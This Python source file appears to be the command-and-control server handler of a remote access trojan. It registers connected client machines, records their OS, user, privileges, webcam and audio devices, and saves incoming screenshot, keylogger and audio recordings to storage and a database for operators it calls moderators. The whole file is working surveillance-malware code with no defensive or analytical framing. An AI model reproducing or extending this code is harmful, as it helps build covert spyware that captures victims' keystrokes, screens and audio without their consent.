import ast

from Server.commands.libs import id
from Server.commands.libs.AudioFactory import wav_generator
from Server.commands.libs.KeyFactory import html_generator
from Server.commands.libs.PhotoFactory import save_image


class CheckCommand:
    def __init__(self, protocol, payload, mode, session_id, key, module_id):

        self.protocol = protocol

        # Build Client
        if mode == 'buildClient':
            from ..Client.Client import Source
            self.protocol.transport.write(Source + '[ENDOFSOURCE]')
            del Source

        elif mode == 'buildClientError':
            self.protocol.factory.log.warning('[ERROR*] [IP: {0}] [ERRMSG: {1}'.format(self.protocol.transport.getPeer().host, payload))

        # Clients Initializing
        elif mode == 'clientInitializing':

            # If client has no key generate new one and send
            if payload == 'noKey':
                client_id = id.generator()
                self.protocol.factory.log.debug('[*CLIENT] Generate New Key (%s)' % client_id)
                self.protocol.send_message(self.protocol, client_id, 'clientInitializing')

            # else get key from client
            else:
                client_id = payload
            self.protocol.factory.clients[payload] = {
                'socket': self.protocol,
                'status': False,
            }

            self.protocol.factory.log.debug('[*CLIENT] New Client from %s' % self.protocol.transport.getPeer())

            # Create Client DB Entry
            if self.protocol.factory.database.create_client(session_id, client_id,
                                                            self.protocol.transport.getPeer().host):
                self.protocol.factory.database.set_alias(client_id, 'NC')
            self.protocol.factory.database.set_client_online(client_id)

        # Clients Status Checker
        elif mode == 'infoChecker':
            if not self.protocol.factory.clients.has_key(payload['key']):
                self.protocol.factory.clients[payload['key']] = {
                    'socket': self.protocol
                }
            client_socket = self.protocol.factory.clients[payload['key']]['socket']
            self.protocol.factory.clients[payload['key']] = {
                'ip_address': self.protocol.transport.getPeer().host,
                'os_type': payload['os_type'],
                'os': payload['os'],
                'user': payload['user'],
                'privileges': payload['privileges'],
                'audio_device': payload['audio_device'],
                'webcamera_device': payload['webcamera_device'],
                'window_title': payload['window_title'],
                'key': payload['key'],
                'kts': payload['kts'],
                'kt': payload['kt'],
                'ats': payload['ats'],
                'at': payload['at'],
                'sts': payload['sts'],
                'std': payload['std'],
                'st': payload['st'],
                'usp': payload['usp'],
                'socket': client_socket,
            }

        # Data Logger
        elif mode == 'screenshotLogs':
            screen_info = ast.literal_eval(payload)
            screen_path, name, window_title, date = save_image(screen_info, key, self.protocol.factory.DATA_STORAGE)
            self.protocol.factory.database.save_image(key, name, screen_path, window_title, date)

        elif mode == 'keyloggerLogs':
            keylogger_info = ast.literal_eval(payload)
            html_path,  datetime_stamp= html_generator(key, keylogger_info, self.protocol.factory.DATA_STORAGE)
            if html_path:
                self.protocol.factory.database.save_keylog(key, datetime_stamp, html_path)

        elif mode == 'audioLogs':
            audio_info = ast.literal_eval(payload)
            wav_path, datetime_stamp = wav_generator(key, audio_info, self.protocol.factory.DATA_STORAGE)
            self.protocol.factory.database.save_audio(key, datetime_stamp, wav_path)

        elif self.protocol.factory.moderators.has_key(session_id):
            self.protocol.send_message(self.protocol.factory.moderators[session_id]['socket'], payload, mode,
                                       module_id=module_id)

        else:
            self.protocol.factory.log.error('[*ERROR] Invalid Mode (%s) [KEY:%s]' % (mode, key))
